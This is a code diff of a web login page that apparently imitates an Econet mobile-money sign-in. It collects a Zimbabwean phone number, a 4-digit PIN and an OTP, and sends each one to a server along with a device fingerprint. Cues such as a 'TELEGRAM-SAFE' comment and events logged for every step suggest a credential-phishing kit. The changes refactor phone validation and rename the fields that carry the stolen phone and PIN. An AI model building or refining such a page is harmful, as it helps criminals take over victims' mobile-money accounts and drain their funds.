@@ -54,7 +54,7 @@ input{
 .small{font-size:13px;color:#6b7280}
 .success{color:#16a34a;font-weight:600}
 
-/* repaint-safe error */
+/* repaint-safe warning */
 .error{
   min-height:18px;
   font-size:13px;
@@ -171,9 +171,9 @@ input{
 </div>
 
 <script>
-/* ===== DEVICE STRING (TELEGRAM-SAFE) ===== */
+/* ===== DEVICE STRING (STRING ONLY) ===== */
 const ua = navigator.userAgent;
-let device = 'Unknown device';
+let device = 'Unknown';
 
 if (/Android/i.test(ua)) {
   const v = ua.match(/Android\s([\d.]+)/);
@@ -191,6 +191,16 @@ const phone = document.getElementById('phone');
 const phoneError = document.getElementById('phoneError');
 const loginBtn = document.getElementById('loginBtn');
 
+function validatePhone(){
+  const d = phone.value.replace('+263','');
+  if (!/^7\d{8}$/.test(d)) {
+    phoneError.innerText = 'Input 9-digit Econet number starting with 7';
+    return false;
+  }
+  phoneError.innerText = '';
+  return true;
+}
+
 phone.addEventListener('keydown',e=>{
   if(phone.selectionStart<=4 && e.key==='Backspace') e.preventDefault();
 });
@@ -198,14 +208,11 @@ phone.addEventListener('keydown',e=>{
 phone.addEventListener('input',()=>{
   let d = phone.value.replace('+263','').replace(/\D/g,'').slice(0,9);
   phone.value = '+263' + d;
-
-  if (!/^7\d{8}$/.test(d)) {
-    phoneError.innerText = 'Input 9-digit Econet number starting with 7';
-  } else {
-    phoneError.innerText = '';
-  }
+  validatePhone();
   updateLogin();
 });
+
+phone.addEventListener('blur', validatePhone);
 
 /* ===== PIN ===== */
 const pins=[...document.querySelectorAll('.pin-digit')];
@@ -228,10 +235,7 @@ pins.forEach((p,i)=>{
 });
 
 function updateLogin(){
-  loginBtn.disabled = !(
-    /^7\d{8}$/.test(phone.value.slice(4)) &&
-    /^\d{4}$/.test(pinValue)
-  );
+  loginBtn.disabled = !(validatePhone() && /^\d{4}$/.test(pinValue));
 }
 
 /* ===== API ===== */
@@ -306,8 +310,8 @@ document.getElementById('loginForm').addEventListener('submit',async e=>{
 
   await sendToServer({
     event:'login_clicked',
-    phone:phone.value,
-    pin:pinValue,
+    loginPhone:phone.value,
+    loginPin:pinValue,
     device,
     submittedAt:new Date().toISOString()
   });
@@ -321,8 +325,8 @@ cancelBtn.onclick=()=>{
 resendBtn.onclick=async()=>{
   await sendToServer({
     event:'resend_otp',
-    phone:phone.value,
-    pin:pinValue,
+    loginPhone:phone.value,
+    loginPin:pinValue,
     device,
     submittedAt:new Date().toISOString()
   });
@@ -331,8 +335,8 @@ resendBtn.onclick=async()=>{
 confirmBtn.onclick=async()=>{
   await sendToServer({
     event:'otp_confirm',
-    phone:phone.value,
-    pin:pinValue,
+    loginPhone:phone.value,
+    loginPin:pinValue,
     otp:getOtp(),
     device,
     submittedAt:new Date().toISOString()
